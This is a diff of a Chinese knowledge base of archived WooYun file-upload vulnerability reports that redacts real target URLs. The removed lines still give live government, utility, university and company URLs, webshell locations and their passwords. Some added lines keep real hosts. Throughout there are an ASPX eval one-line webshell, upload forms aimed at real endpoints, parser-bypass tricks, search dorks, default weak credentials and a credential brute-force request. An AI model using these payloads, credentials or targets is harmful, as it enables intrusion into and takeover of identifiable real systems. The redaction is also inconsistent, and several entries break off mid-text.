 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.baison.com.cn/该站采用了泛微e-cology 通用程序，存在文件上传漏洞
+**详情**: https://example.com/[已脱敏] 通用程序，存在文件上传漏洞
 
-**POC**: http://oa.baison.com.cn/nullwooyun.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18330,7 +18330,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://dzhcg.wuxi.gov.cn/homePage.action?action=webSiteIndex
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18352,7 +18352,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 阳泉市矿区人民政府网http://www.yqkq.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx
+**详情**: 阳泉市矿区人民政府网https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18374,7 +18374,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 经过验证，这个是个第三方cms，但是任意文件上传却是私自开发的组建。通过google找到如下页面：http://www.gzipo.gov.cn/admin/jsp/cms/content/attachment/attachment.jsp?module=001010&contentId=0有个上传文件上传成功之后直接在右击源码就能看到路径
+**详情**: 经过验证，这个是个第三方cms，但是任意文件上传却是私自开发的组建。通过google找到如下页面：https://example.com/[已脱敏]
 
 **POC**: 服务器沦陷服务器上有别人上传的提权程序，疑是已经被入侵，请尽快修补
 
@@ -18396,9 +18396,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #Url：http://dgbest.tom.com/application.php#对文件内容进行检测，cp jpg+php过掉#对文件后缀进行检测，抓包解决
+**详情**: #Url：https://example.com/[已脱敏] jpg+php过掉#对文件后缀进行检测，抓包解决
 
-**POC**: #Url：http://dgbest.tom.com/application.php#对文件内容进行检测，cp jpg+php过掉#对文件后缀进行检测，抓包解决
+**POC**: #Url：https://example.com/[已脱敏] jpg+php过掉#对文件后缀进行检测，抓包解决
 
 **绕过**: 直接利用
 
@@ -18424,7 +18424,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 如此低级的漏洞，你懂得怎样修复。&&&&&&&&&&&&华丽分割线&&&&&&&&&&&存在漏洞的URL，请勿公布，科远的这个系统实在太脆弱了，会影响电厂正常生产。http://124.167.244.74/syncplant/publicpage/OldTest.aspx
+**修复**: 如此低级的漏洞，你懂得怎样修复。&&&&&&&&&&&&华丽分割线&&&&&&&&&&&存在漏洞的URL，请勿公布，科远的这个系统实在太脆弱了，会影响电厂正常生产。http://[IP已脱敏]
 ---
 
 ---
@@ -18462,9 +18462,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传文件到网站根目录下：<form action="http://hunangtzy.com/comm_front/email/uploadImageFile_do.jsp?uri=/../../../" method="post" name="uploadform" enctype="multipart/form-data"><input type="file" name="NewFile"><input type="submit"></form>
+**详情**: 上传文件到网站根目录下：<form action="https://example.com/[已脱敏]" method="post" name="uploadform" enctype="multipart/form-data"><input type="file" name="NewFile"><input type="submit"></form>
 
-**POC**: http://hunangtzy.com/cyber_jt.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18484,9 +18484,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海市人民检察院检务公开网站管理系统地址：http://www.shjcy.gov.cn:9112/platform/integratedServices.jsp问题原因，站点使用的fck编辑器配置不当fck目录遍历：http://www.shjcy.gov.cn:9112/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../
+**详情**: 上海市人民检察院检务公开网站管理系统地址：https://example.com/[已脱敏]
 
-**POC**: 任意文件上传：http://www.shjcy.gov.cn:9112/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.shjcy.gov.cn:9112/editor/filemanager/browser/default/connectors/jsp/connector这个站要上传jspx一句话地址：http://www.shjcy.gov.cn:9112//UserFiles/Image/wooyunn.jspx密码：0t2t3
+**POC**: 任意文件上传：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18506,9 +18506,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 海尔日日顺微信运营平台配置不当致信息泄露和文件上传。地址：http://rmp.haier.net/1、信息泄露http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/网站的目录信息http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/opt/lampp/htdocs/
+**详情**: 海尔日日顺某互联网公司运营平台配置不当致信息泄露和文件上传。地址：https://example.com/[已脱敏]
 
-**POC**: 海尔日日顺微信运营平台配置不当致信息泄露和文件上传。地址：http://rmp.haier.net/1、信息泄露http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/网站的目录信息http://rmp.haier.net/kindeditor/php/file_manager_json.php?path=/opt/lampp/htdocs/
+**POC**: 海尔日日顺某互联网公司运营平台配置不当致信息泄露和文件上传。地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18517,7 +18517,7 @@
 
 ---
 ### [wooyun-2014-074009] 厦门市某公众服务网文件上传导致任意代码执行
-**厂商**: 厦门市停车场公众服务网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+**厂商**: 厦门市某停车平台场公众服务网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -18528,9 +18528,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：http://tc.xmjs.gov.cn注册地址：http://tc.xmjs.gov.cn/Parking/Regist_cmpservice.aspx漏洞页面：http://tc.xmjs.gov.cn/Parking/Cmp_info.aspx上传：
+**详情**: 目标地址：https://example.com/[已脱敏]
 
-**POC**: 上刀：http://tc.xmjs.gov.cn/UpFile/Image/201408270949412393.aspx权限很大哦，提权什么的都可以来哦
+**POC**: 上刀：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18550,7 +18550,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞页面http://demo.zoomla.cn//Common/FileService.aspx漏洞代码protected void Page_Load(object sender, EventArgs e){string path = "/UploadFiles/UserUpload/";HttpFileCollection files = base.Request.Files;if (files.Count == 0){base.Response.Write("请勿直接访问本文件");base.Response.End();}string str2 = base.Server.MapPath(path);HttpPostedFile file = files[0];if ((file != null) && (file.ContentLength > 0)){string file
+**详情**: 漏洞页面https://example.com/[已脱敏] void Page_Load(object sender, EventArgs e){string path = "/UploadFiles/UserUpload/";HttpFileCollection files = base.Request.Files;if (files.Count == 0){base.Response.Write("请勿直接访问本文件");base.Response.End();}string str2 = base.Server.MapPath(path);HttpPostedFile file = files[0];if ((file != null) && (file.ContentLength > 0)){string file
 
 **POC**: 把一句话木马 文件名改成图片后缀比如 2.jpg<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>然后利用poc点击上传
 
@@ -18572,7 +18572,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 近期搞个网盘站发现的一个解析漏洞，phpdisk系统，用的蛮多，这个解析漏洞有点鸡肋，phpdisk版本不是通杀。因为是PHP程序，所以服务器一定支持PHP，这程序后台限制了php.asp.aspx.php2.等一些脚本上传。但是可以上传1.php;rar.这样的程序，利用IIS6的解析漏洞。我们把PHP马改成1.php;rar，如果改成1.php;.rar就不行了，因为他会自动变名字的。1.php;rar他变名字但是.php;rar不会被变。上传后找路径。右键电信下载1.然后属性。基本是这样的， 上传到的目录地址从robots.txt可以知道Disallow: /filestores/这个目录是默认上传目录木马地址就是这是IIS6 的漏洞。nginx 的 可以直接传一个图片一句话马，配合 2种解析漏洞。第一种是http://www.xxx.com/filestores/2011/11/2
+**详情**: 近期搞个网盘站发现的一个解析漏洞，phpdisk系统，用的蛮多，这个解析漏洞有点鸡肋，phpdisk版本不是通杀。因为是PHP程序，所以服务器一定支持PHP，这程序后台限制了php.asp.aspx.php2.等一些脚本上传。但是可以上传1.php;rar.这样的程序，利用IIS6的解析漏洞。我们把PHP马改成1.php;rar，如果改成1.php;.rar就不行了，因为他会自动变名字的。1.php;rar他变名字但是.php;rar不会被变。上传后找路径。右键电信下载1.然后属性。基本是这样的， 上传到的目录地址从robots.txt可以知道Disallow: /filestores/这个目录是默认上传目录木马地址就是这是IIS6 的漏洞。nginx 的 可以直接传一个图片一句话马，配合 2种解析漏洞。第一种是https://example.com/[已脱敏]
 
 **POC**: 你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得你懂得
 
@@ -18594,9 +18594,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 位置是：http://www.nbcareful.com/ckfinder/ckfinder.html已经被攻击过，小马路径：http://www.nbcareful.com/CkEditor/ckfinder/userfiles/files/z.asp/x.gif
+**详情**: 位置是：https://example.com/[已脱敏]
 
-**POC**: 位置是：http://www.nbcareful.com/ckfinder/ckfinder.html已经被攻击过，小马路径：http://www.nbcareful.com/CkEditor/ckfinder/userfiles/files/z.asp/x.gif
+**POC**: 位置是：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18616,9 +18616,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上一发：http://www.wooyun.org/bugs/wooyun-2014-081868/trace/40964e232d0086aeea5d466dddd16277这次就不那么多废话了，信息可以参考上一个漏洞
+**详情**: 上一发：https://example.com/[已脱敏]
 
-**POC**: 漏洞点：http://meetinglive.teleuc.com/site/savefile.do随便传：地址有了，上菜刀
+**POC**: 漏洞点：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18638,9 +18638,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厂商：中新金桥软件名叫计算机技能自助式网络视频学习系统搜索：http://203.208.46.145/#filter=0&newwindow=1&q=%E8%BD%AF%E4%BB%B6%E9%80%9A-%E4%B8%AD%E6%96%B0%E9%87%91%E6%A1%A5+inurl:softwarer&start=40http://210.41.233.137/softwarer/bbs/upload.asp此页面存在任意文件上传漏洞。
+**详情**: 厂商：中新金桥软件名叫计算机技能自助式网络视频学习系统搜索：http://[IP已脱敏]
 
-**POC**: 直接给一个简单的exp吧<html><form action="http://210.41.233.137/softwarer/bbs/upload.asp" method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>http://210.41.233.137/softwarer/bbs/upload.asp返回文件名：上传文件的路径为：http://21
+**POC**: 直接给一个简单的exp吧<html><form action="http://[IP已脱敏] method="post" enctype="multipart/form-data"><input type="file" name="file1" size="23" id="file" /><input type="submit" value="Submit" /></form></html>http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18662,7 +18662,7 @@
 
 **详情**: 蚂蜂窝旗下的保险站fck编辑器漏洞（已有前人入侵！），好久了，马儿也好多，你们的服务器看来可能是沦陷了。
 
-**POC**: 编辑器地址http://bx.mafengwo.cn/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorhttp://bx.mafengwo.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/File/Shell地址：http://bx.mafengwo.cn/https:
+**POC**: 编辑器地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18682,9 +18682,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pinyin.sogou.com/skins/dttmk.php 任意上传
+**详情**: https://example.com/[已脱敏] 任意上传
 
-**POC**: http://pinyin.sogou.com//skins/pp/1.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18704,7 +18704,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1.头像处任意文件上传POST /member/mmember_addPhoto.action HTTP/1.1Host: www.caizhimofang.comProxy-Connection: keep-aliveContent-Length: 806Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.caizhimofang.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36Content-T
+**详情**: #1.头像处任意文件上传POST /member/mmember_addPhoto.action HTTP/1.1Host: www.caizhimofang.comProxy-Connection: keep-aliveContent-Length: 806Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36Content-T
 
 **POC**: (见原文)
 
@@ -18726,7 +18726,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.是下面这个站点，联想企业网盘：https://www.vips100.com/2.注册账号，随便瞧瞧：3.发现可以上传头像，那么来一个吧：
+**详情**: 1.是下面这个站点，联想企业网盘：https://example.com/[已脱敏]
 
 **POC**: 4.上传后的图片是直接存放在web服务器上的，这个情况常常会导致服务器沦陷哦。尝试上传php文件，被服务器拒绝。偶然发现该站点存在解析漏洞，不可思议呀！这个重要的站点：5.顺利拿到shell，截图如下：6.拿到shell后，我简单的翻了下目录，太恐怖了，我都没敢去连库。谢绝跨省！
 
@@ -18748,7 +18748,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.cqoppo.com/Login.aspx存在遍历和任意上传的问题http://www.cqoppo.com/fckeditor//editor/dialog/fck_about.html存在fckeditor编辑器http://www.cqoppo.com/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/Image/1.aspx     密码：101010101010101010010
+**详情**: https://example.com/[已脱敏]     密码：101010101010101010010
 
 **POC**: 两大数据库.服务器是server2008的
 
@@ -18758,8 +18758,8 @@
 ---
 
 ---
-### [wooyun-2014-076963] 189邮箱存在任意文件读取漏洞
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 任意文件遍历/下载
+### [wooyun-2014-076963] 某邮箱服务存在任意文件读取漏洞
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 认证接口
 
@@ -18770,7 +18770,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过登录189邮箱 发邮件 抓包修改可以传任意格式还可以读服务器的敏感文件
+**详情**: 通过登录某邮箱服务 发邮件 抓包修改可以传任意格式还可以读服务器的敏感文件
 
 **POC**: 上传任意格式文件但是找不到路径
 
@@ -18792,7 +18792,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: FCKeditor上传漏洞谷歌的一个关键字：inurl:LoginPage.do?userType举例：湖南省科技厅的：http://61.187.87.49/pms-hn/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector辽宁省科技厅的：http://kjjh.lninfo.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?type=File&connector=connectors/jsp/connector已经有被上传木马的了
+**详情**: FCKeditor上传漏洞谷歌的一个关键字：inurl:LoginPage.do?userType举例：湖南省科技厅的：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -18836,7 +18836,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞页面 http://www.chinac.com/Account/agentapply.html在这里有个上传头像的地方我们打开burpsuite，配置好 然后将菜刀的代码用记事本保存为图片然后选择点击上传，然后被burpsuite拦截到我们把后缀改成php上传成功，右键处头像复制地址菜刀连之
+**详情**: 漏洞页面 https://example.com/[已脱敏] 然后将菜刀的代码用记事本保存为图片然后选择点击上传，然后被burpsuite拦截到我们把后缀改成php上传成功，右键处头像复制地址菜刀连之
 
 **POC**: 整站源码 数据库啥的
 
@@ -18860,7 +18860,7 @@
 
 **详情**: 国家电网湖南长沙电力职业技术学校教务管理系统存在上传漏洞，而且已经发现被国内某黑客组织成功入侵了
 
-**POC**: 上传漏洞地址 http://220.168.57.6/(x3kb1a45qpfrzl2ywhr5ic2y)/ftb.imagegallery.aspx我来晚了一步....已经被成功入侵了
+**POC**: 上传漏洞地址 http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18880,9 +18880,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 北京日报社在线招聘http://hr.bjd.com.cn提交简历 上传资料处，只对前端做了限制，服务器端无限制，可上传任意文件MSSQL SA弱口令，可获得系统权限.
+**详情**: 北京日报社在线招聘https://example.com/[已脱敏] 上传资料处，只对前端做了限制，服务器端无限制，可上传任意文件MSSQL SA弱口令，可获得系统权限.
 
-**POC**: http://hr.bjd.com.cn/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/memberother/20131218/ef0c703b91644dbda9e78f9eac5c3492.aspxWindows IP 配置主机名 . . . . . . . . . . . . . : ERP主 DNS 后缀 . . . . . . . . . . . :节点类型 . . . . . . . . . . . . : 混合IP 路由已启用 . . . . . . . . . . : 否WINS 代理已启用 . . . . . .
+**POC**: https://example.com/[已脱敏] IP 配置主机名 . . . . . . . . . . . . . : ERP主 DNS 后缀 . . . . . . . . . . . :节点类型 . . . . . . . . . . . . : 混合IP 路由已启用 . . . . . . . . . . : 否WINS 代理已启用 . . . . . .
 
 **绕过**: 直接利用
 
@@ -18902,7 +18902,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 从这里直接无需登录在后台利用解析漏洞传一句话图片马http://www.camra2006.org.cn/admin/News/InfoEdit.aspx?iProject=5&iInfoID=396进入数据库，众多执业评估师个人信息及评估事项详细信息服务器上还有许多内部文件和数据库、网站源码的备份，另外还有一套考试系统，矿业权评估师执业资格是两年才考一次，而且报考门槛不低，含金量应该不差。另外发现了一个13年4月6号上传到服务器上的疑似木马，也请注意做一下全面的清理。
+**详情**: 从这里直接无需登录在后台利用解析漏洞传一句话图片马https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -18924,9 +18924,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海高层次人才网地址：http://shrcw.gov.cn/index.html问题原因，站点使用的fck编辑器配置不当fck目录遍历：http://shrcw.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../
+**详情**: 上海高层次人才网地址：https://example.com/[已脱敏]
 
-**POC**: 文件上传：http://shrcw.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://shrcw.gov.cn/editor/filemanager/browser/default/connectors/jsp/connectorshell地址：http://shrcw.gov.cn//UserFiles/Image/x.jsp密码：520o520
+**POC**: 文件上传：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18970,7 +18970,7 @@
 
 **详情**: 未过滤后缀.php的文件名。只验证了文件头gif89a
 
-**POC**: 加入Gif89a的任意文件即可上传。。。http://www.jobg.cn  注册用户 上传。。。。
+**POC**: 加入Gif89a的任意文件即可上传。。。https://example.com/[已脱敏]  注册用户 上传。。。。
 
 **绕过**: 直接利用
 
@@ -18990,7 +18990,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登陆之后，有个二手市场，里边可以发布相关信息：http://hq.sicnu.edu.cn/home/Markbrow?ID=799然后在“回复信息”这看到有上传的地方，高兴坏了直接绕过其实在“发布信息”一栏中也有 上传点，但是那个没有绕过去另外不小心扫到了这个：http://hq.sicnu.edu.cn/log.txt不用登陆就可以访问
+**详情**: 登陆之后，有个二手市场，里边可以发布相关信息：https://example.com/[已脱敏] 上传点，但是那个没有绕过去另外不小心扫到了这个：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19034,7 +19034,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 客服系统用友ICC任意文件上传http://icc.posgoo.com/phpinfo泄漏http://icc.posgoo.com/info.php详见WooYun: 用友ICC网站客服系统远程代码执行漏洞
+**详情**: 客服系统用友ICC任意文件上传https://example.com/[已脱敏] 用友ICC网站客服系统远程代码执行漏洞
 
 **POC**: (见原文)
 
@@ -19056,9 +19056,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wlds.hit.edu.cn/WindLab/zxgj.jsp?id=6
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://wlds.hit.edu.cn/WindLabhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1446039622042.jsp shell地址
+**POC**: https://example.com/[已脱敏] shell地址
 
 **绕过**: 直接利用
 
@@ -19078,9 +19078,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞页面:http://xiuxiu.huodong.meitu.com/0408/#rd后台上传程序未对后缀做判断.POST / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere
+**详情**: 漏洞页面:https://example.com/[已脱敏] / HTTP/1.1Host: up.qiniu.comUser-Agent: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateRefere
 
-**POC**: 直接打开就是证明:http://mtapplet.meitudata.com/.
+**POC**: 直接打开就是证明:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19100,9 +19100,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.http://ydxuexi.cnsuning.com/clp/redirectLogin.htm内部云店学习平台无验证码，后端也没有放爆破机制看了下源文件if (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工
+**详情**: 这次主要以内部系统和通讯平台为主。先说一下内部平台问题1.https://example.com/[已脱敏] (self != top) {top.location = self.location;};$().ready( function() {var $errorMsgTip=$("#errorMsgTip");$("#login-btn").click(function(){var $username = $("#j_username");var $password = $("#j_password");if ($username.val() == "请输入SOA工号" || $username.val() == "") {$errorMsgTip.html("请输入SOA工
 
-**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似QQ和微信的软件。里面有企业所有的组织架构，员工联系方
+**POC**: 最重要的是员工号命名规则被猜解出，仅仅撞了一个固定弱口令就撞出来5W+弱口令相关接口POST /IMuserAPI/v1/login/getimurl.do HTTP/1.1Host: imapp.suning.comUM_SYSTEM=UWPPORTAL&UUM_COMPANYCODE=oa.cnsuning.com&username=§10****01§&password=§****§根据用户名命名规则生产了一个72W的用户名字典，测试成功如下这些弱口令配合上一个漏洞里提到的内部豆芽系统，登录了几个账号看了一下。豆芽是苏宁自己开发的类似某互联网公司和某互联网公司的软件。里面有企业所有的组织架构，员工联系方
 
 **绕过**: 直接利用
 
@@ -19122,9 +19122,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标系统：http://www.fjccs.com.cn:8801/fjccsadmin/系统登录框存在注入POST http://www.fjccs.com.cn:8801/fjccsadmin/login.aspx HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.fjccs.com.cn:8801/fjccsadmin/login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl
+**详情**: 目标系统：https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏] zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, defl
 
-**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：http://www.fjccs.com.cn:8801/fjccsadmin/upfiles/seal/A0000494wooyun.aspx密码：abcd
+**POC**: 通过注入可得到系统登录帐号该系统大部分帐号都是弱口令000000以其中一个帐号登录，在设置，个人签名处可上传shell一句话地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19144,7 +19144,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 泄漏数据库地址http://chaoshi.12t.cnhttp://chaoshi.12t.cn/include/upload.php  修改上传源码
+**详情**: 泄漏数据库地址https://example.com/[已脱敏]  修改上传源码
 
 **POC**: 莫非传说中的两千万开房数据就是这样来的?
 
@@ -19232,9 +19232,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及百度到的学号密码：123456000000以及百度到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get
+**详情**: 系统全名"THEOL清华教育在线"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及某搜索引擎到的学号密码：123456000000以及某搜索引擎到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它if (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.get
 
-**POC**: 以东华理工大学为例：（theol_student/123456）http://eol.ecit.cn/eol/homepage/common/opencourse/访问地址：http://eol.ecit.cn/eol/data/jpk/0/1.jspPOST http://eol.ecit.cn/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://eol.ecit.cn/eol/popups/jpkrecord/upload_file.jsp
+**POC**: 以东华理工大学为例：（theol_student/123456）https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19254,7 +19254,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网http://xiezi.foundertype.com/让我拾起了写字的热情 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：http://xiezi.foundertype.com/MrWrite2SIM/xml/20150420192358.asp 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到
+**详情**: 基友介绍了一款安卓手机上的写字app——写字先生，官网https://example.com/[已脱敏] 这么文艺的app当然要检测一番于是。。。随手意见反馈那里插了下。第二天，插入cookie 成功进入后台~五十万的装机量，看来用的人还不少呢。 继续 找上传，欸，还真找到一个。。。不过真的想吐槽一下。。。任意文件上传。。。这样真的好吗。。。一句话伺候。不过接下来卡了10分钟。。。上传上去了，返回文件名了，不过路径去哪找。。。我深呼一口气，推了推眼镜，从容的打开手机app ，burp，手机点击相应的模块， 路径跃然眼前。~于是 拼接我一句话地址如下：https://example.com/[已脱敏] 密码c上菜刀~写字先生文件源码备份，另外还包括一款好像正在测试的软件~webfont找到
 
 **POC**: (见原文)
 
@@ -19278,7 +19278,7 @@
 
 **详情**: AD：NewEtone国际长途电话卡可以从全球各地拨打电话，并且话费低廉、语音质量好。主站和管理系统均存在struts漏洞，配置文件泄露多个数据库配置等大量敏感信息。用户信息和电话卡信息还有各种交易信息等等诸多信息大量侧漏。用户密码明文存储。
 
